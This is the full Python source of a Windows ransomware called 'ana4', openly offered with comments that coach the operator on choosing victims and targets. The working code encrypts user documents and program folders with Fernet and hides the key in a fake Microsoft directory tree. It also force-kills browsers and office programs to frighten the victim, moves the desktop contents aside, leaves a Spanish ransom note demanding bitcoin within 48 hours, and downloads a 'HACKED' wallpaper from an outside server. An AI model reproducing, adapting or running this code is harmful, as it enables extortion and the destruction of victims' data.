#  This is a ransomware that is designed for windows 10 & 11 made to corrupt targeted files and programs as admin,
#  this is the version 7.0 called ana4 and it is paired with the decryption software lana4, this malware
#  is designed to work in the following way:


#  First it will find all of the users in the system incase there is more than one, after this inside of
#  that user, it will find the directories you want to target. (You can change them in the code
#  once you studied your victim.) After, it will attack any additional folders that you want even if they
#  are outside of the users. (Normally used to target programs, but you can get creative if you want.)

#  Once all of this is done it will create a fake directory tree, that looks like a component of Windows
#  but surprise, it isn't. Inside of this fake tree there will be many fake files that are generated randomly,
#  the names and contents are also generated randomly, as well as the amount of files per directory
#  (You can also change it in the code.) the contents are filled with random non human recognizable
#  characters, all of this is designed to create confusion to a IT guy that does not know much
#  about cyberattacks, the reason there is so much fake bullshit in there is because in all of that mess of
#  folders and files, the ransomware stores its vital files, the key and the list.

#  Now for the actual attack; a loop is created, this loop will run until the last target file has been
#  attempted to encrypt, the reason I say attempted is because even as admin, windows will not let you
#  modify the files that "TrustedInstaller" owns. The way the loop works is simple:

#       1st. It will close all selected programs so that they can be encrypted. (It also scares the victim.)

#       2nd. It will start the counters, one for files scanned, another for files encrypted.

#       3rd. It will declare the exceptions, such as desktop.ini and every file that
#       does not start with a letter or number.

#       4th. It will start reading all files from all targets and if it has writing permission it will
#       encrypt them, and if it can't, it will declare it as an exception.

#       5th. Every 500 files that are encrypted it reesends a signal to close all selected programs
#       this is done for two reasons, the first is to ensure the victim can't do anything useful while
#       the attack is executing, and the second reason is to terrify the victim.

#  After all of this is done, it will save a list with the route and name of the files that were encrypted,
#  this list is very important; without it, the decryption software will never be able to fix the damage.
#  This list is stored in the fake tree that we have created previously.

#  For a grand finale, it will detect where your Desktop is, and leave a note informing the victim 
#  that they were attacked and what to do to get their files back, as well as changing the wallpaper.

### THE CODE STARTS HERE ###

# Necesary imports.
import os
import random
import time
import subprocess
import shutil
import ctypes
import urllib.request
from cryptography.fernet import Fernet

# This will find the users.
def findUsers(directory):
    users = []                                                                      # Create empty user list. 
    for f in os.scandir(directory):                                                 # Scan the users that exist inside of C:\Users.
        if f.name[0].isalpha() and f.is_dir() and not f.name == 'Default User':     # If it starts with a letter, it exists and it is not
                                                                                    # a Default User.
            users.append(f.path)                                                    # Then get the path for the user.
    return users                                                                    # And add it to users.

# This will find the target foldrs inside of each user.
def findFolders(users, target_dirs):
    folders = []                                                    # Create a empty list for folders.
    for user in users:                                              # For the users in the user list.
        for target in target_dirs:                                  # And for the targets in the target directories.
            nodrive_name = os.path.join(user, target)               # Join the name of the user with the target directory.
            onedrive_name = os.path.join(user, f'OneDrive{target}') # And the same but puting OneDrive before.
            folders.append(nodrive_name)                            # Add it to folders.
            folders.append(onedrive_name)                           # Add it to folders.
    clean_folder = []                                               # Create a empty list for a clean folder.
    for fld in folders:                                             # For the folders in the previous list.
        if os.path.isdir(fld):                                      # If it exists.
            clean_folder.append(fld)                                # Get the path for them.
    return clean_folder                                             # Put it in the clean folder list.

# This will create the fake directory tree.
def createFolders(mydirlist):                                       
    for mydir in mydirlist:                                         # For my directories in my list.
        if not os.path.exists(mydir):                               # If it does not exist.
            os.makedirs(mydir)                                      # Make it.

# This creates a random text generator to fill the fake files, for the fake tree.
def fillme(treeseeds1):
    # Define extraction of one element from a list. 
    def randWord(tupleChoice):                                      
        return random.choice(tupleChoice)
    
    # This creates a list of things to create the names of the fake files.
    def randNameGen():                                                          # List of posible choices.
        frst_comp = 'ms', '', 'wai', 'mlk', 'muuu'
        scnd_comp = 'looker', 'bmp', '', 'sql', 'bimp', 'exec' '32'
        thrd_comp = 'temp', 'setup', 'DMR_48' 'WIN' 'hev'
        extension = '.dll', '.mui', '.exe'

        # This puts the things toguether for naming the files.
        while True:
            fc = randWord(frst_comp)                                            # Makes a choice from first list.
            sc = randWord(scnd_comp)                                            # Makes a choice from second list.
            tc = randWord(thrd_comp)                                            # Makes a choice from third list.
            ex = randWord(extension)                                            # Makes a choice from forth list.
            tog = fc, sc, tc, ex                                                # Orders it.         
            ftog = ''.join(tog)                                                 # Puts it toguether.
            yield ftog                                                          # It will give you the name.

    # This converts normal letters to weird characters.
    def getAplpha(simple):                                                      # Normal alphabet.
        if simple:                                                  
            return '0123456789ABCDEF'                                          
        
        # This mixes normal and unreadeable alphabet.
        def convChar(x):
            nonprintable = {                                                    # List of printable characters to not printable.
                '\x00': '^@',
                '\x01': '^A',
                '\x02': '^B',
                '\x03': '^C',
                '\x04': '^D',
                '\x05': '^E',
                '\x06': '^F',
                '\x07': '^G',
                '\x08': '^H',
                '\x09': '^I',
            }
            character = chr(x)                                         # Gets characters one by one.
            return nonprintable.get(character, character)              # Returns the x even if it is or it isn't in the non printable.
        alphabet = random.sample(list(range(128)), 16)                 # Choose 16 numbers between 0 and 128
        alphabet = list(map(lambda x : convChar(x), alphabet))         # Creates a list that converts the intitures to characters, 
                                                                       # if it is in the non printable list it gets converted.  
        return ''.join(alphabet)                                       # Returns a joined version of the alphabet as a string.

    # This will use our random variable alphabet to create text. 
    def randText(number_of_words):
        words = ["#"+''.join([random.choice(getAplpha(False)) for j in range(random.randint(1, 12))]) # It will create a word
    # that starts with # and then it will join toguether characters in a random range from 1 to 12.                                                
            for i in range(number_of_words)]                                                          # Repeat a number of times.
        return ''.join(words)                                                                         # Joins words.

    # This specifies the random ammount of files per directory.
    MIN_FILES = 1
    MAX_FILES = 3

    # Make the generator
    name_gen = randNameGen()

    # Define the number of times that this porcess will ocurr per directory.
    numbers = [random.randint(MIN_FILES, MAX_FILES) for _ in treeseeds1]

    # Creates a loop 
    for numb, root in zip(numbers, treeseeds1):     # It creates a variable numb for numbers and root for treeseeds1.
        for _ in range(numb):                       
            name = next(name_gen)                   # Gives the generated name.
            f11_name = os.path.join(root, name)     # Creates route to create the file.
            volume = random.randint(2000, 5000)     # Range of how many words per text.
            with open(f11_name, 'w') as f:          # Creates file.
                text_info = randText(volume)        # Generates the random text in the cuantity of words.
                f.write(text_info)                  # Puts it in the file.

# This tells the malware were the users are in windows.
directory = r'C:\users'
users = findUsers(directory)

# This makes the target directories inside of user.
target_dirs = [
    'Desktop',
    'Downloads',
    'Documents',
    'Escritorio',
    'Descargas',
    'Documents'
]
# This makes sure they are inside of users.
folders = findFolders(users, target_dirs)

# These directories are a list for targeting the entire system. 
# (Originally made to corrupt programs, but be creative.) 

# My personal recomendation is to be as precise as possible in the targets, killing everything takes a long time,
# killing just the essencial program files not so much, allways asume victims computers are slow.
raw_additional_folders = [
    r'C:\Program Files\LibreOffice',
]

# This puts all of the aditional files toguether.
additional_folders = []
for fld in raw_additional_folders:
    if os.path.isdir(fld):
        additional_folders.append(fld)

# This builds all of the target directories by putting toguether the user targets and the system targets.
folders_tog = folders + additional_folders

# This will give you feedback of what directories you are targeting. (Really important if you fucked up.)
print(folders_tog)

# This is a list of all of the directories that are going to be built in the fake tree, 
# used for confusion and to store our vital files (Encryption key and List of encrypted files.)
mydirlist = [
    r'C:\Program Files (x86)\Microsoft Agenda\WindowsPowerShell (x86)',
    r'C:\Program Files (x86)\Microsoft Agenda\Windows Kits',
    r'C:\Program Files (x86)\Microsoft Agenda\Windows Agenda Mail',         # I like this one for storing the vital files.
    r'C:\Program Files (x86)\Microsoft Agenda\Windows Agenda',
    r'C:\Program Files (x86)\Microsoft Agenda\Windows Platform',
]

# This specifies in what directory of the list we will store our vital files. In this case in the Agenda Mail.
storage = mydirlist [2] 

# This actually creates the directory tree.
createFolders(mydirlist)

# This fills the directory tree with random bullshit. (https://i.kym-cdn.com/photos/images/newsfeed/002/638/553/929.jpg)
fillme(mydirlist)

# This builds the encryption key. (Vital for dencryption.)
key = Fernet.generate_key()

# This writes the key and puts it in the specified directory.
with open(fr'{storage}\key.txt', 'wb') as f:
    f.write(key)

# This creates the empty list of targets.
result = []

# This creates 2 counters, one for files seen count_s and one for files encrypted, count_e.
count_s = 0
count_e = 0

# This is the loop that encrypts files 
for folder in folders_tog:
    for dirpath, dirnames, filenames in os.walk(folder):
        for filename in filenames:

            # This sets the encrypted counter to print "Files Infected X" every 50 files, change this number at will.
            if 0 == count_e%50:
                print(f'Files Infected {count_e}')

            # Everytime the code gets here it will add 1 to the seen counter.
            count_s += 1

            # This sets the seen counter to print "Files Seen X" every 50 files, change this number at will.
            if 0 == count_s%50:
                print(f'Files Seen {count_s}')

            # Exception created for desktop.ini. (Windows won't let you touch this.)
            if filename == 'desktop.ini':
                continue

            # Exception created for every file that does not start in a number or letter. 
            # (Weird windows files start with symbols and are protected, we dont want to waste time.)
            if not filename[0].isalpha() and not filename[0].isdigit():
                continue

            # This will join the directory path with thr file name.
            name = os.path.join(dirpath, filename)

            # This will open it and read the file.
            with open (name, 'rb') as f:
                content = f.read()
            
            # This will use they key to encrypt what was read.
            content_encripted = Fernet(key).encrypt(content)
            
            # This will write over the file with the same information but encrypted. 
            try:
                with open (name, 'wb') as f:
                    f.write(content_encripted)

            # For every file that it cant encrypt insted of breaking the loop, it will declare it as a exception and continue.
            except Exception as e:
                print(e)
                continue

            # Get the name (route+file) of everything you encrypted
            result.append(name)

            # At the start of the attack and every 500 files encrypted, send a signal to close the listed programs.
            if count_e%500 == 0:
                subprocess.call("TASKKILL /F /IM msedge.exe", shell=True)
                subprocess.call("TASKKILL /F /IM firefox.exe", shell=True)
                subprocess.call("TASKKILL /F /IM soffice.exe", shell=True)
                subprocess.call("TASKKILL /F /IM swriter.exe", shell=True)
                subprocess.call("TASKKILL /F /IM soffice.bin", shell=True) # Remember that office software has a temp copy of everything,
                                                                           # close this or it won't close.
            
            # Everytime the code gets here it will add 1 to the encrypted counter.
            count_e += 1

# Give feedback of how many files in total have been encrypted.
print(len(result))

# This writes a list of everything that was encrypted and were it was when it was encrypted.
with open(fr'{storage}\list.txt', 'w') as f:    # Create the list in the specified directory from the fake tree.
    for line in result:                         # Get each line from the result individualy.
        f.write(f"{line}\n")                    # Each line will be written in the list in a diferent line.

# This will find the dektop and write the threat note.
def desktop_mv(threatAddress):

    # This writtes the note that will be left in the victims desktop.
    contents = 'Hemos encriptado todos sus archivos. \n\
    Si quereis desencriptarlos teneis 48 horas para enviar \
    X BTC a la siguiente direccion \n\
    XXXXXX \n\
    De lo contrario seran eliminados. \n\
    Una vez se haya realizado el pago recibireis \
    Instrucciones de como desencriptarlos. \n\
    Muchas gracias por su amable colaboracion ;-)'

    # This moves al files to a directory made by us and creates the note in desktop.

    if os.path.isdir(threatAddress):                                        # If it exists.
        Temp1 = fr'{threatAddress}\Hacked\\'                                # Create directory for storing the things in Desktop.
        os.makedirs(Temp1)                                                  # Make it.

        # This moves all of the files from desktop to the directory.
        for file_name1 in os.listdir(threatAddress):                         # Scan the desktop.
            source1 = threatAddress + file_name1                             # Join path with file name.
            destination1 = Temp1 + file_name1                                # Join new path with filename.
            if os.path.isfile(source1):                                      # If what it joined is a file.
                shutil.move(source1, destination1)                           # Move it to directory.

        # This moves all of the directories from desktop to the directory.
        for dir_name1 in os.listdir(threatAddress):                         # Scan the Dektop.
            shutil.move(os.path.join(threatAddress, dir_name1), Temp1)      # Join path with directory name and move it to dir.
                
        with open(fr'{threatAddress}\AVISO_ATAQUE.txt', 'w') as f:          # Create the file.
            f.write(contents)                                               # And write inside the note from contents. 

# This will exctract just the current logged in username to be inserted in the route that leaves a note in desktop. 
username = os.getlogin() 

# List of all posible locations for the desktop.
threat_sys = [
    fr'C:\Users\{username}\Desktop\\',
    fr'C:\Users\{username}\OneDrive\Desktop\\' ,
    fr'C:\Users\{username}\Escritorio\\'  ,
    fr'C:\Users\{username}\OneDrive\Escritorio\\',
]

# Loop that goes through the options for the possible locations of desktop.
for options in threat_sys:
    desktop_mv(options)

# Download the image for the wallpaper.
url = "https://github.com/AlexanderBissett/Yurii-is-a-idiot/raw/main/HACKED.jpg"

# Directory to store the image. 
filename, headers = urllib.request.urlretrieve(url, filename=f"C:\\Users\\{username}\\Saved Games\\HACKED.jpg")

# Replace windows wallpaper with our image.
ctypes.windll.user32.SystemParametersInfoW(20, 0, f'C:\\Users\\{username}\\Saved Games\\HACKED.jpg' , 0)